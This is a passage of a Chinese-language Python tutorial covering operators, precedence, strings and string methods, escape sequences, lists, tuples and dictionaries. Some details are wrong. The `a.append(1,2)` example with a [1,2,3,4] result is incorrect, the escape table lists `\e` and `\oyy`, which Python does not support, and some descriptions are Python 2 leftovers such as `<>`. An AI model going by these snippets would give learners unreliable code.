<td>小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。注意，这些变量名的大写。</td>
<td>(a &lt; b) 返回 True。</td>
</tr>
<tr>
<td>&gt;=</td>
<td>大于等于 - 返回x是否大于等于y。</td>
<td>(a &gt;= b) 返回 False。</td>
</tr>
<tr>
<td>&lt;=</td>
<td>小于等于 - 返回x是否小于等于y。</td>
<td>(a &lt;= b) 返回 True。</td>
</tr>
</tbody></table>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>以下假设变量a为10，变量b为20：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>=</td>
<td>简单的赋值运算符</td>
<td>c = a + b 将 a + b 的运算结果赋值为 c</td>
</tr>
<tr>
<td>+=</td>
<td>加法赋值运算符</td>
<td>c += a 等效于 c = c + a</td>
</tr>
<tr>
<td>-=</td>
<td>减法赋值运算符</td>
<td>c -= a 等效于 c = c - a</td>
</tr>
<tr>
<td>*=</td>
<td>乘法赋值运算符</td>
<td>c *= a 等效于 c = c * a</td>
</tr>
<tr>
<td>/=</td>
<td>除法赋值运算符</td>
<td>c /= a 等效于 c = c / a</td>
</tr>
<tr>
<td>%=</td>
<td>取模赋值运算符</td>
<td>c %= a 等效于 c = c % a</td>
</tr>
<tr>
<td>**=</td>
<td>幂赋值运算符</td>
<td><code>c **= a 等效于 c = c ** a</code></td>
</tr>
<tr>
<td>//=</td>
<td>取整除赋值运算符</td>
<td>c //= a 等效于 c = c // a</td>
</tr>
</tbody></table>
<h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>&amp;</td>
<td>按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0</td>
<td>(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100</td>
</tr>
<tr>
<td>|</td>
<td>按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。</td>
<td>(a | b) 输出结果 61 ，二进制解释： 0011 1101</td>
</tr>
<tr>
<td>^</td>
<td>按位异或运算符：当两对应的二进位相异时，结果为1</td>
<td>(a ^ b) 输出结果 49 ，二进制解释： 0011 0001</td>
</tr>
<tr>
<td>~</td>
<td>按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。~x类似于 -x-1</td>
<td>(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左移动运算符：运算数的各二进位全部左移若干位，由”&lt;&lt;”右边的数指定移动的位数，高位丢弃，低位补0。</td>
<td>a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右移动运算符：把”&gt;&gt;”左边的运算数的各二进位全部右移若干位，”&gt;&gt;”右边的数指定移动的位数</td>
<td>a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111</td>
</tr>
</tbody></table>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20:</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>逻辑表达式</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>and</td>
<td>x and y</td>
<td>布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。</td>
<td>(a and b) 返回 20。</td>
</tr>
<tr>
<td>or</td>
<td>x or y</td>
<td>布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td>
<td>(a or b) 返回 10。</td>
</tr>
<tr>
<td>not</td>
<td>not x</td>
<td>布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td>
<td>not(a and b) 返回 False</td>
</tr>
</tbody></table>
<h3 id="成员运算符"><a href="#成员运算符" class="headerlink" title="成员运算符"></a>成员运算符</h3><p>除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>in</td>
<td>如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td>not in</td>
<td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td>
</tr>
</tbody></table>
<h3 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h3><p>身份运算符用于比较两个对象的存储单元</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody><tr>
<td>is</td>
<td>is 是判断两个标识符是不是引用自一个对象</td>
<td><strong>x is y</strong>, 类似 <strong>id(x) == id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td>
</tr>
<tr>
<td>is not</td>
<td>is not 是判断两个标识符是不是引用自不同对象</td>
<td><strong>x is not y</strong> ， 类似 <strong>id(a) != id(b)</strong>。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td>
</tr>
</tbody></table>
<h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p>以下表格列出了从最高到最低优先级的所有运算符：</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>**</td>
<td>指数 (最高优先级)</td>
</tr>
<tr>
<td>~ + -</td>
<td>按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
</tr>
<tr>
<td>* / % //</td>
<td>乘，除，取模和取整除</td>
</tr>
<tr>
<td>+ -</td>
<td>加法减法</td>
</tr>
<tr>
<td>&gt;&gt; &lt;&lt;</td>
<td>右移，左移运算符</td>
</tr>
<tr>
<td>&amp;</td>
<td>位 ‘AND’</td>
</tr>
<tr>
<td>^ |</td>
<td>位运算符</td>
</tr>
<tr>
<td>&lt;= &lt; &gt; &gt;=</td>
<td>比较运算符</td>
</tr>
<tr>
<td>&lt;&gt; == !=</td>
<td>等于运算符</td>
</tr>
<tr>
<td>= %= /= //= -= += <em>= *</em>=</td>
<td>赋值运算符</td>
</tr>
<tr>
<td>is is not</td>
<td>身份运算符</td>
</tr>
<tr>
<td>in not in</td>
<td>成员运算符</td>
</tr>
<tr>
<td>and or not</td>
<td>逻辑运算符</td>
</tr>
</tbody></table>
<p>括号可改变优先级与结合顺序</p>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="数"><a href="#数" class="headerlink" title="数"></a>数</h2><p>在 Python 中数的类型有三种：</p>
<ul>
<li>整数(int)：1，2，3</li>
<li>浮点数(float)：1.0    1.1    52.3E-4 (表示 52.3乘以10的-4次方)    1e4(表示1乘以10的4次方)</li>
<li>复数(comlex)：-5+4j    2.3-4.6j</li>
</ul>
<p>在 Python 中不用区分‘long int’类型。默认的整数类型可以任意长(长度应该与内存包括虚拟内存的大小有关)。</p>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(type(<span class="number">1</span>))		<span class="comment">#print()为输出函数 type()获取参数的数据类型</span></span><br><span class="line">print(type(<span class="number">-1</span>))</span><br><span class="line">print(type(<span class="number">1E4</span>))</span><br><span class="line">print(type(<span class="number">1.0</span>))</span><br><span class="line">print(type(<span class="number">52.3E-4</span>))</span><br><span class="line">print(type(<span class="number">-5</span>+<span class="number">4j</span>))</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">int</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">float</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">float</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">float</span>'&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">complex</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>字符串是字符的序列。字符串基本上就是一组单词。单词可以是英语或其它由 Unicode 标准支持的语言，其实这也意味着世界上几乎所有的语言,默认所有的字符串的编码是 Unicode 。一个字符串一旦创建，就不能再改变它。</p>
<h3 id="字符串的使用"><a href="#字符串的使用" class="headerlink" title="字符串的使用"></a>字符串的使用</h3><p>你可以用单引号指定字符串，如 <code>&#39;Quote me on this&#39;</code> 。所有的空白，即空格和制表符都照原样保留。在双引号中的字符串与单引号中的字符串的使用<strong>完全相同</strong>，例如 <code>&quot;What’s yourname?&quot;</code> 。分单双引号的作用主要体现引号中还有引号的情况如：<code>&quot;Quote &#39;me&#39; on this&quot;</code></p>
<p>利用三引号（”””or’’’），你可以指示一个多行的字符串。你可以在三引号中自由的使用单引号和双引号。</p>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">'Quote me on this'</span>)</span><br><span class="line">print(<span class="string">'''</span></span><br><span class="line"><span class="string">This is a multi-line string. This is the first line.</span></span><br><span class="line"><span class="string">2 This is the second line.</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line">print(<span class="string">"What’s yourname?"</span>)</span><br><span class="line">print(<span class="string">"""</span></span><br><span class="line"><span class="string">This is a multi-line string. This is the first line.</span></span><br><span class="line"><span class="string">2 This is the second line.</span></span><br><span class="line"><span class="string">"""</span>)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Quote me on this</span><br><span class="line"></span><br><span class="line">This is a multi-line string. This is the first line.</span><br><span class="line">2 This is the second line.</span><br><span class="line"></span><br><span class="line">What’s yourname?</span><br><span class="line"></span><br><span class="line">This is a multi-line string. This is the first line.</span><br><span class="line">2 This is the second line.</span><br></pre></td></tr></table></figure>

<h3 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h3><ul>
<li><p>格式化输出</p>
</li>
<li><p>‘+’连接</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">25</span></span><br><span class="line">name = <span class="string">'Swaroop'</span></span><br><span class="line">print(name+<span class="string">'is'</span>+str(age)+<span class="string">'years old'</span>)	<span class="comment">#age 需转化为string类型</span></span><br><span class="line">print(<span class="string">'Why is '</span>+name+<span class="string">'playing with that python?'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>format 方法</li>
</ul>
<p>有时我们并不想用其他信息来构造字符串。这儿 format() 方法就很有用。</p>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">25</span></span><br><span class="line">name = <span class="string">'Swaroop'</span></span><br><span class="line">print(<span class="string">'&#123;0&#125; is &#123;1&#125; years old'</span>.format(name, age))</span><br><span class="line">print(<span class="string">'Why is &#123;0&#125; playing with that python?'</span>.format(name))</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Swaroop is 25 years old</span><br><span class="line">Why is Swaroop playing with that python?</span><br></pre></td></tr></table></figure>

<ul>
<li>print()连接</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">2</span></span><br><span class="line">print(<span class="string">'他'</span>,x,<span class="string">'岁了'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">他 2 岁了</span><br></pre></td></tr></table></figure>

<h3 id="字符串的操作"><a href="#字符串的操作" class="headerlink" title="字符串的操作"></a>字符串的操作</h3><p>如有字符串<code>mystr = &#39;hello world itcast and itcastcpp&#39;</code>，以下是常见的操作</p>
<h4 id="find"><a href="#find" class="headerlink" title="find()"></a>find()</h4><p>检测 str 是否包含在 mystr中，如果是返回开始的索引值，否则返回-1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.find(str, start&#x3D;0, end&#x3D;len(mystr))</span><br></pre></td></tr></table></figure>

<h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>跟find()方法一样，只不过如果str不在 mystr中会报一个异常.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.index(str, start&#x3D;0, end&#x3D;len(mystr))</span><br></pre></td></tr></table></figure>

<h4 id="count"><a href="#count" class="headerlink" title="count"></a>count</h4><p>返回 str在start和end之间 在 mystr里面出现的次数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.count(str, start&#x3D;0, end&#x3D;len(mystr))</span><br></pre></td></tr></table></figure>

<h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>把 mystr 中的 str1 替换成 str2,如果 count 指定，则替换不超过 count 次.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.replace(str1, str2,  mystr.count(str1))</span><br></pre></td></tr></table></figure>

<h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>以 str 为分隔符切片 mystr，如果 maxsplit有指定值，则仅分隔 maxsplit 个子字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.split(str&#x3D;&quot; &quot;, 2)</span><br></pre></td></tr></table></figure>

<h4 id="capitalize"><a href="#capitalize" class="headerlink" title="capitalize"></a>capitalize</h4><p>把字符串的第一个字符大写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.capitalize()</span><br></pre></td></tr></table></figure>

<h4 id="title"><a href="#title" class="headerlink" title="title"></a>title</h4><p>把字符串的每个单词首字母大写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.title()</span><br></pre></td></tr></table></figure>

<h4 id="startswith"><a href="#startswith" class="headerlink" title="startswith"></a>startswith</h4><p>检查字符串是否是以 obj 开头, 是则返回 True，否则返回 False</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.startswith(obj)</span><br></pre></td></tr></table></figure>

<h4 id="endswith"><a href="#endswith" class="headerlink" title="endswith"></a>endswith</h4><p>检查字符串是否以obj结束，如果是返回True,否则返回 False.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.endswith(obj)</span><br></pre></td></tr></table></figure>

<h4 id="lower"><a href="#lower" class="headerlink" title="lower"></a>lower</h4><p>转换 mystr 中所有大写字符为小写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.lower()</span><br></pre></td></tr></table></figure>

<h4 id="upper"><a href="#upper" class="headerlink" title="upper"></a>upper</h4><p>转换 mystr 中的小写字母为大写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.upper()</span><br></pre></td></tr></table></figure>

<h4 id="ljust"><a href="#ljust" class="headerlink" title="ljust"></a>ljust</h4><p>返回一个原字符串左对齐,并使用空格填充至长度 width 的新字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.ljust(width)</span><br></pre></td></tr></table></figure>

<h4 id="rjust"><a href="#rjust" class="headerlink" title="rjust"></a>rjust</h4><p>返回一个原字符串右对齐,并使用空格填充至长度 width 的新字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.rjust(width)</span><br></pre></td></tr></table></figure>

<h4 id="center"><a href="#center" class="headerlink" title="center"></a>center</h4><p>返回一个原字符串居中,并使用空格填充至长度 width 的新字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.center(width)</span><br></pre></td></tr></table></figure>

<h4 id="lstrip"><a href="#lstrip" class="headerlink" title="lstrip"></a>lstrip</h4><p>删除 mystr 左边的空白字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.lstrip()</span><br></pre></td></tr></table></figure>

<h4 id="rstrip"><a href="#rstrip" class="headerlink" title="rstrip"></a>rstrip</h4><p>删除 mystr 字符串末尾的空白字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.rstrip()</span><br></pre></td></tr></table></figure>

<h4 id="strip"><a href="#strip" class="headerlink" title="strip"></a>strip</h4><p>删除mystr字符串两端的空白字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mystr.strip()</span><br></pre></td></tr></table></figure>

<h4 id="rfind"><a href="#rfind" class="headerlink" title="rfind"></a>rfind</h4><p>类似于 find()函数，不过是从右边开始查找.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.rfind(str, start&#x3D;0,end&#x3D;len(mystr) )</span><br></pre></td></tr></table></figure>

<h4 id="rindex"><a href="#rindex" class="headerlink" title="rindex"></a>rindex</h4><p>类似于 index()，不过是从右边开始.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.rindex( str, start&#x3D;0,end&#x3D;len(mystr))</span><br></pre></td></tr></table></figure>

<h4 id="partition"><a href="#partition" class="headerlink" title="partition"></a>partition</h4><p>把mystr以str分割成三部分,str前，str和str后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.partition(str)</span><br></pre></td></tr></table></figure>

<h4 id="rpartition"><a href="#rpartition" class="headerlink" title="rpartition"></a>rpartition</h4><p>类似于 partition()函数,不过是从右边开始.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.rpartition(str)</span><br></pre></td></tr></table></figure>

<h4 id="splitlines"><a href="#splitlines" class="headerlink" title="splitlines"></a>splitlines</h4><p>按照行分隔，返回一个包含各行作为元素的列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.splitlines()</span><br></pre></td></tr></table></figure>

<h4 id="isalpha"><a href="#isalpha" class="headerlink" title="isalpha"></a>isalpha</h4><p>如果 mystr 所有字符都是字母 则返回 True,否则返回 False</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.isalpha()</span><br></pre></td></tr></table></figure>

<h4 id="isdigit"><a href="#isdigit" class="headerlink" title="isdigit"></a>isdigit</h4><p>如果 mystr 只包含数字则返回 True 否则返回 False.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.isdigit()</span><br></pre></td></tr></table></figure>

<h4 id="isalnum"><a href="#isalnum" class="headerlink" title="isalnum"></a>isalnum</h4><p>如果 mystr 所有字符都是字母或数字则返回 True,否则返回 False</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.isalnum()</span><br></pre></td></tr></table></figure>

<h4 id="isspace"><a href="#isspace" class="headerlink" title="isspace"></a>isspace</h4><p>如果 mystr 中只包含空格，则返回 True，否则返回 False.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.isspace()</span><br></pre></td></tr></table></figure>

<h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>mystr 中每个字符后面插入str,构造出一个新的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.join(str)</span><br></pre></td></tr></table></figure>

<h3 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h3><p>因为一些符号在python语法中有特殊含义，如<code>&#39;</code> <code>&quot;</code> <code>\</code> 等，不能直接在字符串使用,需要使用转义序列将其转义。</p>
<p>若你想指定一些字符串不被特殊处理，例如像转义序列，则需要通过在字符串前面加<code>r</code>或<code>R</code>来指定自然字符串。</p>
<table>
<thead>
<tr>
<th>转义字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>\(在行尾时)</td>
<td>续行符</td>
</tr>
<tr>
<td>\\</td>
<td>\</td>
</tr>
<tr>
<td>\‘</td>
<td>‘</td>
</tr>
<tr>
<td>\&quot;</td>
<td>“</td>
</tr>
<tr>
<td>\a</td>
<td>响铃</td>
</tr>
<tr>
<td>\b</td>
<td>退格(Backspace)</td>
</tr>
<tr>
<td>\e</td>
<td>转义</td>
</tr>
<tr>
<td>\000</td>
<td>空</td>
</tr>
<tr>
<td>\n</td>
<td>换行</td>
</tr>
<tr>
<td>\v</td>
<td>纵向制表符</td>
</tr>
<tr>
<td>\t</td>
<td>横向制表符</td>
</tr>
<tr>
<td>\r</td>
<td>回车</td>
</tr>
<tr>
<td>\f</td>
<td>换页</td>
</tr>
<tr>
<td>\oyy</td>
<td>八进制数，yy代表的字符，例如：\o12代表换行</td>
</tr>
<tr>
<td>\xyy</td>
<td>十六进制数，yy代表的字符，例如：\x0a代表换行</td>
</tr>
<tr>
<td>\other</td>
<td>其它的字符以普通格式输出</td>
</tr>
</tbody></table>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#常用的转义示例</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'what\'s your name?'</span>)	<span class="comment">#单引号</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">"what a \"good\" boy!"</span>)	<span class="comment">#双引号</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">"换行：\n第一行\n第二行"</span>)	<span class="comment">#换行</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'制表符\t1\t2\t3'</span>)	<span class="comment">#制表符(即键盘上的Tab键)</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'1\\2\\3\\4\\5'</span>)	<span class="comment">#反斜杠</span></span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line">print(<span class="string">'续行符：123\</span></span><br><span class="line"><span class="string">456\</span></span><br><span class="line"><span class="string">789'</span>)</span><br><span class="line">print(<span class="string">'='</span>*<span class="number">20</span>)</span><br><span class="line"><span class="comment">#自然字符串</span></span><br><span class="line">print(<span class="string">r'换行：\n第一行\n第二行'</span>)	<span class="comment">#可见\n失效了，其他可自己试一下，在字符串前加r或R即可</span></span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">====================</span><br><span class="line">what's your name?</span><br><span class="line">====================</span><br><span class="line">what a "good" boy!</span><br><span class="line">====================</span><br><span class="line">换行：</span><br><span class="line">第一行</span><br><span class="line">第二行</span><br><span class="line">====================</span><br><span class="line">制表符     1       2       3</span><br><span class="line">====================</span><br><span class="line">1\2\3\4\5</span><br><span class="line">====================</span><br><span class="line">续行符：123456789</span><br><span class="line">====================</span><br><span class="line">换行：\n第一行\n第二行</span><br></pre></td></tr></table></figure>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>list 是处理一组有序项目的数据结构，即你可以在一个列表中存储一个序列的项目。</p>
<p>列表中的项目应该包括在<code>方括号</code>中，这样 Python 就知道你是在指明一个列表。一旦你创建了一个列表，你可以<code>添加</code>、<code>删除</code>或是<code>搜索</code>列表中的项目。由于你可以增加或删除项目，我们说列表是可变的数据类型，即这种类型是可以被改变的。</p>
<h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><p>假设有列表：<code>a=[1,2];b=[3,4]</code></p>
<ul>
<li>append：向列表添加元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.append(<span class="number">1</span>,<span class="number">2</span>)	<span class="comment">#[1,2,3,4]</span></span><br><span class="line">a.append(b)		<span class="comment">#[1,2,[3,4]]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>extend：向另一个集合中的元素逐一添加到列表</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.extend(b)		<span class="comment">#[1,2,3,4]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>insert(index,object)：在指定位置index前插入元素object</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a.insert(<span class="number">1</span>,<span class="number">3</span>)	<span class="comment">#[1,3,2]</span></span><br></pre></td></tr></table></figure>

<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>直接指定下标修改</p>
<h3 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h3><ul>
<li><p>使用<code>in</code>和<code>not in</code></p>
</li>
<li><p>index</p>
<p>检测 x 是否包含在 mylist 的指定区间中，如果是返回开始的索引值，否则返回一个异常</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mylist.index(x, start&#x3D;0, end&#x3D;len(mystr))	#左闭右开</span><br></pre></td></tr></table></figure>
</li>
<li><p>count()：返回 str在start和end之间 在 mystr里面出现的次数</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mystr.count(str, start&#x3D;0, end&#x3D;len(mystr))</span><br></pre></td></tr></table></figure>

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><ul>
<li>del：根据下标进行删除</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">del</span> mylist[<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>pop：删除最后一个元素</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mylist.pop()</span><br></pre></td></tr></table></figure>

<ul>
<li>remove：根据元素的值进行删除</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mylist.remove(<span class="string">'123'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><ul>
<li><p>sort方法是将list按特定顺序重新排列，默认为由小到大，参数reverse=True可改由大到小。</p>
</li>
<li><p>reverse方法是将list逆置。</p>
</li>
</ul>
<h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><p>元组用来将多样的对象集合到一起。<code>元组和列表十分类似</code>，只不过元组和字符串一样是<code>不可变</code>的即你不能修改元组。元组通过<code>圆括号</code>中用<code>逗号分割的项目</code>定义。</p>
<p>一个空的元组由一对空的圆括号组成，如 myempty = ()。然而，含有单个元素的元组就不那么简单了。你必须在第一个（唯一一个）项目后跟一个逗号，这样 Python 才能区分元组和表达式中一个带圆括号的对象。</p>
<p>index和count与字符串和列表中的用法相同</p>
<h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典类似于你通过联系人名字查找地址和联系人详细情况的地址簿，即，我们把<code>键</code>（名字）和<code>值</code>（详细情况）联系在一起。注意，<code>键必须是唯一的</code>，就像如果有两个人恰巧同名的话，你无法找到正确的信息。</p>
<p>你只能使用不可变的对象（比如字符串）来作为字典的键，但是你可以把不可变或可变的对象作为字典的值。</p>
<p>键值对在字典中以这样的方式标记：d = {key1 : value1, key2 : value2 }。注意它们的<code>键/值对用冒号分割</code>，而<code>各个对用逗号分割</code>，所有这些都包括在<code>花括号</code>中。</p>
<p>记住字典中的键/值对是没有顺序的。如果你想要一个特定的顺序，那么你应该在使用前自己对它们排序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建字典</span></span><br><span class="line">ab = &#123; <span class="string">'Swaroop'</span> : <span class="string">'swaroop@swaroopch.com'</span>,</span><br><span class="line"><span class="string">'Larry'</span> : <span class="string">'larry@wall.org'</span>,</span><br><span class="line"><span class="string">'Matsumoto'</span> : <span class="string">'matz@ruby-lang.org'</span>,</span><br><span class="line"><span class="string">'Spammer'</span> : <span class="string">'spammer@hotmail.com'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#访问字典值</span></span><br><span class="line">print(<span class="string">"Swaroop's address is"</span>, ab[<span class="string">'Swaroop'</span>])</span><br><span class="line"><span class="comment">#删除字典值</span></span><br><span class="line"><span class="keyword">del</span> ab[<span class="string">'Spammer'</span>]</span><br><span class="line">print(<span class="string">'\nThere are &#123;0&#125; contacts in the address-book\n'</span>.format(len(ab)))</span><br><span class="line"><span class="comment">#遍历字典</span></span><br><span class="line"><span class="keyword">for</span> name, address <span class="keyword">in</span> ab.items():</span><br><span class="line">    print(<span class="string">'Contact &#123;0&#125; at &#123;1&#125;'</span>.format(name, address))</span><br><span class="line"><span class="comment">#添加/修改字典值</span></span><br><span class="line">ab[<span class="string">'Guido'</span>] = <span class="string">'guido@python.org'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'Guido'</span> <span class="keyword">in</span> ab:</span><br><span class="line">    print(<span class="string">"\nGuido's address is"</span>, ab[<span class="string">'Guido'</span>])</span><br><span class="line"><span class="comment">#清空整个字典</span></span><br><span class="line">ab.clear()</span><br></pre></td></tr></table></figure>

